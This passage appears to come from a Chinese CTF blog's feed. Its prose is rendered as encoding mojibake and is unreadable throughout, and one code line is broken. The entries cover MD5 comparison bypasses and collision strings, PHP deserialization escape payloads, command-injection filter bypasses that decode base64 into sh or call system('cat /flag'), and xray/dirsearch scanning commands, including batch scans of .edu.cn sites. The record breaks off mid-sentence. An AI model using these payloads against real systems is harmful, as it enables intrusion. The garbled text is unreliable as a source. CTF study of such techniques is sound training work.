        <content type="html"><![CDATA[<p>0x04 MD5ç¢°æ’è„šæœ¬<br>æˆäººä»¥é±¼ä¸å¦‚æˆäººä»¥æ¸”ï¼Œä¸‹é¢ä½¿å¤šçº¿ç¨‹MD5å“ˆå¸Œç¢°æ’è„šæœ¬ï¼Œå¨åŠ›å·¨å¤§ã€‚æ˜¯æ ¹æ®ç½‘ä¸Šä»£ç æ”¹ç¼–è€Œæˆï¼ŒéåŸåˆ›ã€‚</p><pre><code># -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len,. start=0, size=20):    global CHARS    while not stop_event.is_set():        rnds = &#39;&#39;.join(random.choice(CHARS) for _ in range(size))        md5 = hashlib.md5(rnds)        value = md5.hexdigest()        if value[start: start+str_len] == substr:            print rnds            stop_event.set()            &#39;&#39;&#39;            #ç¢°æ’åŒmd5            md5 = hashlib.md5(value)            if md5.hexdigest()[start: start+str_len] == substr:                print rnds+ &quot;=&gt;&quot; + value+&quot;=&gt;&quot;+ md5.hexdigest()  + &quot;\n&quot;                stop_event.set()            &#39;&#39;&#39; if __name__ == &#39;__main__&#39;:    substr = sys.argv[1].strip()    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0    str_len = len(substr)    cpus = multiprocessing.cpu_count()    stop_event = multiprocessing.Event()    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,                                         stop_event, str_len, start_pos))                 for i in range(cpus)]    for p in processes:        p.start()    for p in processes:        p.join()</code></pre><p>ä¸Šé¢è„šæœ¬æ³¨é‡Šéƒ¨åˆ†æ˜¯åŒMD5ç¢°æ’ï¼Œå–æ¶ˆæ³¨é‡Šç„¶åæ³¨é‡Šæ‰16è¡Œå³å¯ã€‚</p><p>ä½¿ç”¨æ–¹æ³•ï¼špython md5Crack.py â€œä½ è¦ç¢°æ’çš„å­—ç¬¦ä¸²â€ å­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®</p><p>ä¾‹å¦‚ï¼špython md5Crack.py â€œ0eâ€ 0</p><p>å°†äº§ç”ŸMD5å€¼ä¸º0eå¼€å¤´çš„å­—ç¬¦ä¸²ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> è„šæœ¬ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è„šæœ¬ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5ç»•è¿‡æ‰‹æ³•</title>
      <link href="/2021/10/08/MD5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/08/MD5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>ffifdyopï¼Œè¿™ä¸ªç‚¹çš„åŸç†æ˜¯ ffifdyop è¿™ä¸ªå­—ç¬¦ä¸²è¢« md5 å“ˆå¸Œäº†ä¹‹åä¼šå˜æˆ 276f722736c95d99e921722cf9ed621cï¼Œ<br>å†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼šâ€™orâ€™6&lt;ä¹±ç &gt;  å³  â€˜orâ€™66ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b<br>è¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯ â€˜ or â€˜6ï¼Œ</p><p>md5(string,raw)</p><p>md5()è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œå¯ä»¥ä¸¤ä¸ªé‡Œé¢è¾“å…¥æ•°ç»„ï¼Œè¿™æ ·éƒ½æ˜¯False,ç­‰äºï¼Œå¯ä»¥ç»•è¿‡</p><p>0eç»•è¿‡</p><pre><code>0eå¼€å¤´çš„å­—ç¬¦ä¸²åœ¨å‚ä¸æ¯”è¾ƒæ—¶,ä¼šè¢«å½“åšç§‘å­¦è®¡æ•°æ³•,ç»“æœè½¬æ¢ä¸º0</code></pre><p> æ¯”å¦‚å°†ä¸¤ä¸ªmd5å€¼è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒ</p><p>md5(â€˜QNKCDZOâ€™) == md5(240610708)</p><p>MD5åŠ å¯†åä¼šå˜æˆè¿™ä¸ªæ ·å­</p><p>0e830400451993494058024219903391 == 0e462097431906509019562988736854</p><p>ç”±äº0eå¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè½¬æ¢ä¸º0,æ‰€ä»¥çœŸæ­£æ¯”è¾ƒçš„è¿‡ç¨‹ä¼šå˜æˆä¸‹é¢è¿™æ ·</p><p>0 == 0</p><p>è¿”å›ç»“æœä¸ºtrue,ä¹Ÿå°±æ˜¯è¯´0eå¼€å¤´çš„md5å€¼è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒæ—¶,ç»“æœç›¸ç­‰<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020</p><p>å¼ºç±»å‹<br>(string)$_POST[â€˜aâ€™]!==(string)$_POST[â€˜bâ€™] &amp;&amp; md5($_POST[â€˜aâ€™])===md5($_POST[â€˜bâ€™])<br>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><p>æ”¶å½•ä¸€äº›MD5å€¼ç›¸ç­‰çš„å­—ç¬¦ä¸²</p><pre><code>$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;$data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;</code></pre><p>åŒmd5ç»“æœä»ä¸º0eå¼€å¤´å­—ç¬¦ä¸²å¤§å…¨</p><pre><code>MD5å¤§å…¨ï¼š CbDLytmyGm2xQyaLNhWn md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18 md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af 770hQgrBOjrcqftrlaZk md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625 md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064 7r4lGXCH2Ksu2JNT3BYM md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849 md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</code></pre><p>md5(â€˜0e215962017â€™) ==&gt; â€œ0e291242476940776845150308577824â€</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xmlæ¼æ´</title>
      <link href="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/08/xml%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>XXEæ¼æ´å…¨ç§°XML External Entity Injectionå³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·dosæ”»å‡»ç­‰å±å®³ã€‚xxeæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p><ul><li><p>XMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚</p></li><li><p>HTMLè¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚</p></li><li><p>æ‰€æœ‰ XML å…ƒç´ éƒ½é¡»æœ‰å…³é—­æ ‡ç­¾ã€‚</p></li><li><p>XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿã€‚</p></li><li><p>XML å¿…é¡»æ­£ç¡®åœ°åµŒå¥—ã€‚</p></li><li><p>XML æ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´ ã€‚</p></li><li><p>XML çš„å±æ€§å€¼é¡»åŠ å¼•å·</p></li><li><p>æ‰€æœ‰ XML å…ƒç´ éƒ½é¡»æœ‰å…³é—­æ ‡ç­¾ã€‚</p></li><li><p>XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿã€‚</p></li><li><p>XML å¿…é¡»æ­£ç¡®åœ°åµŒå¥—ã€‚</p></li><li><p>XML æ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´ ã€‚</p></li><li><p>XML çš„å±æ€§å€¼é¡»åŠ å¼•å·ã€‚<br><code>&lt;message&gt;hello &lt; world&lt;/message&gt;</code>,ä¸ºäº†é¿å…é”™è¯¯ã€‚æˆ‘ä»¬ç”¨å®ä½“å¼•ç”¨<code>&amp;lt;</code>æ¥ä»£æ›¿â€&lt;â€å­—ç¬¦ã€‚XMLä¸­ï¼Œæœ‰5ä¸ªé¢„å®šä¹‰çš„å®ä½“å¼•ç”¨ã€‚<br>&amp;lt &lt;<br>&amp;gt &gt;<br>&amp;amp &amp;<br>&amp;apos â€˜<br>&amp;quot â€˜<br>è¯­æ³•ï¼š<!-- --></p></li></ul><p>å†…éƒ¨å£°æ˜ï¼š</p><p><img src="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/image-20220311140522532.png" alt="image-20220311140522532"></p><p>å¤–éƒ¨å£°æ˜ï¼š</p><p>â€‹    <img src="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/image-20220311140536481.png" alt="image-20220311140536481"></p><p>xmlå®ä½“ï¼š<br><?xml version="1.0" encoding="utf-8"?></p><p><img src="/2021/10/08/xml%E6%BC%8F%E6%B4%9E/image-20220311140547883.png" alt="image-20220311140547883"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPååºåˆ—åŒ–é€ƒé€¸</title>
      <link href="/2021/10/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/"/>
      <url>/2021/10/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>1.æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿<br>ç¤ºä¾‹ä»£ç ï¼š<br><?phpfunction filter($str){    return str_replace('bb', 'ccc', $str);}class A{    public $name='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"666666";};';    public $pass=123456;}$AA=new A();echo serialize($AA)."\n";$res=filter(serialize($AA));$c=unserialize($res);echo $c->pass;?><br>ç”±äºæ›¿æ¢åbbâ€“&gt;cccå¢åŠ äº†ä¸€ä¸ªå­—ç¬¦ï¼Œå½“æœ‰28ä¸ªbbæ—¶ã€‚ä¼šå¢åŠ 28ä¸ªå­—ç¬¦ï¼Œåˆšå¥½å¡«å……å®Œæˆï¼Œå¯¼è‡´åé¢çš„å­—ç¬¦é€ƒé€¸ â€œ;s:4:â€passâ€;s:6:â€666666â€;};</p><p>2.æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜çŸ­<br>ç¤ºä¾‹ä»£ç ï¼š<br>&lt;?php<br>function str_rep($string){<br>    return preg_replace( â€˜/php|test/â€˜,â€™â€™, $string);<br>}</p><p>$test[â€˜nameâ€™] = $_GET[â€˜nameâ€™];<br>$test[â€˜signâ€™] = $_GET[â€˜signâ€™];<br>$test[â€˜numberâ€™] = â€˜2020â€™;<br>$temp = str_rep(serialize($test));<br>printf($temp);<br>$fake = unserialize($temp);<br>echo â€˜<br>â€˜;<br>print(â€œname:â€.$fake[â€˜nameâ€™].â€™<br>â€˜);<br>print(â€œsign:â€.$fake[â€˜signâ€™].â€™<br>â€˜);<br>print(â€œnumber:â€.$fake[â€˜numberâ€™].â€™<br>â€˜);<br>?&gt;</p><p>åœ¨signä¸­åŠ å…¥ â€œ;s:6:â€numberâ€;s:4:â€2020â€;} é•¿åº¦27<br>éœ€è¦æŠŠå‰é¢çš„signå€¼ç»™å–æ¶ˆæ‰<br>æœ‰ â€œ;  +  s:4:â€signâ€;s:54:â€hello          â€“&gt;24ä¸ªå­—ç¬¦<br>payloadï¼š?name=testtesttesttesttesttest&amp;sign=helloâ€;s:4:â€signâ€;s:4:â€evalâ€;s:6:â€numberâ€;s:4:â€2000â€;}<br>æ¯æ¬¡æ ¹æ®è¿™ä¸ªæ¥è°ƒæ•´å°±å¯  *****hello æ˜¯24  </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> ç½‘ç»œå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°çŸ¥è¯†ç‚¹</title>
      <link href="/2021/10/08/%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2021/10/08/%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p>phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°æ¯”å¦‚ä¸‹é¢çš„ä»£ç ä¼šæ‰§è¡Œ system(â€˜lsâ€™);<br>$a=â€™systemâ€™;<br>$a(â€˜lsâ€™);</p><p>å¯»æ‰¾flagæ–‡ä»¶å¸¸ç”¨å‘½ä»¤å°ç»“ï¼š<br>    system(â€˜lsâ€™) : åˆ—ä¸¾å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶<br>    system(â€œfind / -name flag<em>â€)ï¼šæŸ¥æ‰¾æ‰€æœ‰æ–‡ä»¶ååŒ¹é…flag</em>çš„æ–‡ä»¶<br>    system(â€œcat $(find / -name flag*)â€)ï¼šæ‰“å°æ‰€æœ‰æ–‡ä»¶ååŒ¹é…flag*çš„æ–‡ä»¶</p><p>å¦‚æœç½‘ç«™å­˜åœ¨å¤‡ä»½æ–‡ä»¶ï¼Œå¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€åæœ‰ï¼šâ€œ.gitâ€ ã€â€œ.svnâ€ã€â€œ .swpâ€â€œ.~â€ã€â€œ.bakâ€ã€â€œ.bash_historyâ€ã€â€œ.bkfâ€</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°çŸ¥è¯†ç‚¹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸è§ç»•è¿‡æ–¹æ³•</title>
      <link href="/2021/10/08/%E7%BB%95%E8%BF%87/"/>
      <url>/2021/10/08/%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>ç©ºæ ¼æ›¿ä»£:<br>    ${IFS}<br>    $IFS$9<br>    &lt;<br>    &lt;&gt;<br>    {,}</p><hr><p>sh</p><p>/?ip=127.0.0.1;echo$IFS$2Y2F0IGZsYWcucGhw|base64$IFS$2-d|sh</p><p>å˜é‡æ‹¼æ¥ï¼š<br>/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php</p><p>å†…è”æ³¨é‡Š(å°†åå¼•å·å‘½ä»¤çš„ç»“æœä½œä¸ºè¾“å…¥æ¥æ‰§è¡Œå‘½ä»¤)<br>/?ip=127.0.0.1;cat$IFS$2<code>ls</code></p><p>æŸ¥çœ‹å‘½ä»¤è¡¥å……<br>    cat     ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º<br>    tac     ä»æœ€åä¸€è¡Œå€’åºæ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º<br>    more    æ ¹æ®çª—å£å¤§å°ï¼Œä¸€é¡µä¸€é¡µçš„ç°å®æ–‡ä»¶å†…å®¹<br>    less    å’Œmoreç±»ä¼¼ï¼Œä½†æ˜¯æ˜¯ä»åå¾€å‰ç¿»é¡µå¹¶ä¸”ï¼Œè¿›è¡Œå¯ä»¥æœç´¢å­—ç¬¦<br>    head    åªæ˜¾ç¤ºå¤´å‡ è¡Œ<br>    tail    åªæ˜¾ç¤ºæœ€åå‡ è¡Œ<br>    nl      ç±»ä¼¼äºcat -nï¼Œæ˜¾ç¤ºæ—¶è¾“å‡ºè¡Œå·</p><hr><p>è¿›åˆ¶ç»•è¿‡<br>phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°æ¯”å¦‚ä¸‹é¢çš„ä»£ç ä¼šæ‰§è¡Œ system(â€˜lsâ€™);</p><p>$a=â€™systemâ€™;<br>$a(â€˜lsâ€™);</p><p>å¸¸ç”¨å‡½æ•°ï¼šbase_convert(â€œ1001â€2,10)æ˜¯å°†äºŒè¿›åˆ¶çš„1001è½¬æ¢ä¸º10è¿›åˆ¶<br>dechex 10è¿›åˆ¶è½¬æˆ16è¿›åˆ¶<br>hex2bin  16è¿›åˆ¶è½¬æˆå­—ç¬¦ä¸²çš„å‡½æ•°<br>_GET</p><p><a href="http://4f07a754-92bf-4411-8bd8-a8da7ec1c514.node4.buuoj.cn:81/?c=$p=base_convert(37907361743,10,36)dechex(1598506324);$$p=%7B&#39;system&#39;};$$p">http://4f07a754-92bf-4411-8bd8-a8da7ec1c514.node4.buuoj.cn:81/?c=$p=base_convert(37907361743,10,36)dechex(1598506324);$$p={&#39;system&#39;};$$p</a>(cat /flag)<br>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi=system&amp;abs=cat /flag<br>$_GET{pi}($_GET{abs})  pi=system abs=cat /flag<br>æœ¬æ¥æ˜¯$_GET[]   â€“&gt;å¦‚æœ[]è¢«è¿‡æ»¤å¯ä»¥ç”¨$_GET{}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸è§è½¯ä»¶å‘½ä»¤</title>
      <link href="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h1><h2 id="å•ä¸ªurlæ£€æµ‹"><a href="#å•ä¸ªurlæ£€æµ‹" class="headerlink" title="å•ä¸ªurlæ£€æµ‹"></a>å•ä¸ªurlæ£€æµ‹</h2><p>./xray_windows_amd64 webscan â€“url <a href="https://xxx.edu.cn/">https://xxx.edu.cn</a> â€“html-output edu.html</p><h2 id="æ‰¹é‡æ£€æµ‹"><a href="#æ‰¹é‡æ£€æµ‹" class="headerlink" title="æ‰¹é‡æ£€æµ‹"></a>æ‰¹é‡æ£€æµ‹</h2><p>./xray_windows_amd64 webscan â€“url-file edu.txt â€“html-output e du.html</p><p> E:\sakuraçš„å·¥å…·ç®±\æ‰«æ\xray\xray_windows_amd64.exe webscan â€“url-file C:\Users\Sakura\Desktop\target.txt â€“html-output C:\Users\Sakura\Desktop\edus.html</p><h1 id="dirsearchä½¿ç”¨"><a href="#dirsearchä½¿ç”¨" class="headerlink" title="dirsearchä½¿ç”¨:"></a>dirsearchä½¿ç”¨:</h1><p>dirsearchè‡ªå¸¦çš„å­—å…¸åœ¨dbç›®å½•ä¸‹</p><p>å¸¸ç”¨çš„å‚æ•°æœ‰</p><ul><li><p>-u æŒ‡å®šç½‘å€</p></li><li><p>-e æŒ‡å®šç½‘ç«™è¯­è¨€</p></li><li><p>-w æŒ‡å®šå­—å…¸</p></li><li><p>-r é€’å½’ç›®å½•ï¼ˆè·‘å‡ºç›®å½•åï¼Œç»§ç»­è·‘ç›®å½•ä¸‹é¢çš„ç›®å½•ï¼‰</p></li><li><p>â€“random-agents ä½¿ç”¨éšæœºUA</p></li><li><p>-t æŒ‡å®šçº¿ç¨‹</p></li><li><p>â€“random-agents ä½¿ç”¨éšæœºUSï¼ˆé»˜è®¤å†db/user-agents.txtä¸­ï¼Œå¯ä»¥è‡ªå·±æ·»åŠ ï¼‰</p></li><li><p>-x æ’é™¤æŒ‡å®šçŠ¶æ€ç  </p></li><li><p>-s è¯·æ±‚ä¹‹é—´å¾—å»¶æ—¶ï¼ˆç§’ï¼‰</p></li><li><p>æ‰«æç½‘ç«™zipä»¥åŠphpæ–‡ä»¶æ’é™¤403çŠ¶æ€ç </p><pre><code> dirsearch.py -u http://127.0.0.1  -e php,zip -x 403</code></pre><p>æ‰«ææ‰€æœ‰ç±»å‹å¹¶ä¸”è®¾ç½®çº¿ç¨‹ä¸º20é»˜è®¤ä¸º10</p><pre><code> dirsearch.py -u http://127.0.0.1 -e*-t 20</code></pre><p>è‡ªå®šä¹‰å­—å…¸æ‰«æ</p><pre><code>dirsearch.py -u http://127.0.0.1  -e* -w db/php.txt</code></pre><p>ä½¿ç”¨éšæœºuaå¤´</p><pre><code>dirsearch.py -u http://127.0.0.1  -e* --random-agents</code></pre><p>æŒ‡å®šcookieæ‰«æ</p><pre><code>dirsearch.py -u http://127.0.0.1:999  -e* -c &quot;user=Mo60;&quot;</code></pre><p>é€’å½’æ‰«ææœ€å¤§3å±‚</p><pre><code>dirsearch.py -u http://127.0.0.1  -e* -r 3</code></pre><p>æ¯ä¸€ç§’æ‰«æä¸€æ¬¡</p><pre><code>dirsearch.py -u http://127.0.0.1  -e* -s 1</code></pre><p>å…³äºå­—å…¸</p><p>å­—å…¸å¿…é¡»æ˜¯æ–‡æœ¬æ–‡ä»¶,ä½¿ç”¨ç‰¹æ®Šè¯ï¼…EXTï¼…,ä¼šåœ¨æ‰«ææ—¶å€™æ ¹æ® -e ä¼ è¿›æ¥çš„å€¼ç”Ÿæˆå¯¹åº”çš„å­—å…¸</p><p>ä¾‹:</p><pre><code>Mo60.%EXT%</code></pre><p>ä½¿ç”¨ä»¥ä¸‹è¯­å¥å»æ‰«æ</p><pre><code class="bash"> dirsearch.py -u http://127.0.0.1 -e jsp -w db/str.txt</code></pre></li></ul><pre><code>python dirsearch.py -u http://node4.buuoj.cn:25833/ -e * -s 1 -x 400,403,404,500,503,429 -w C:\Users\Sakura\Desktop\dic\å¤‡ä»½.txt -o C:\Users\Sakura\Desktop\1.txt</code></pre><pre><code>python dirsearch.py  -u http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/ -e * --timeout=2 -t 1 -x 400,403,404,500,503,429 -o C:\Users\Sakura\Desktop\1.txt</code></pre><pre><code>python dirsearch.py -u http://xxx.com/ --header-list=E:\sakuraçš„å·¥ å…·ç®±\å­—å…¸\user-gent.txt -e * -s 1 -t 3 --full-url --proxy=http://127.0.0.1:1080</code></pre><h1 id="Flask-Unsign"><a href="#Flask-Unsign" class="headerlink" title="Flask-Unsign"></a>Flask-Unsign</h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>è¦å®‰è£…åº”ç”¨ç¨‹åºï¼Œåªéœ€ä½¿ç”¨pip:</p><pre><code>$ pip3 install flask-unsign[wordlist]</code></pre><p>å¦‚æœæ‚¨åªæƒ³å®‰è£…æ ¸å¿ƒä»£ç ï¼Œè¯·çœç•¥<code>[wordlist]</code>åç¼€ï¼š</p><pre><code>$ pip3 install flask-unsign</code></pre><p>è¦å‡ºäºå¼€å‘ç›®çš„å®‰è£…è¯¥å·¥å…·ï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼ˆä¸‹è½½å‰¯æœ¬åï¼‰ï¼š</p><pre><code>$ pip3 install -e .[test]</code></pre><h2 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h2><p>è¦è·å¾—æ‰€æœ‰å¯èƒ½é€‰é¡¹çš„æ¦‚è¿°ï¼Œåªéœ€è°ƒç”¨flask unsign without ä»»ä½•è¿™æ ·çš„å‚æ•°ï¼š</p><pre><code>$ flask-unsign</code></pre><h3 id="è·å–è§£ç ä¼šè¯cookies"><a href="#è·å–è§£ç ä¼šè¯cookies" class="headerlink" title="è·å–è§£ç ä¼šè¯cookies"></a>è·å–è§£ç ä¼šè¯cookies</h3><p>ç”±äºflask 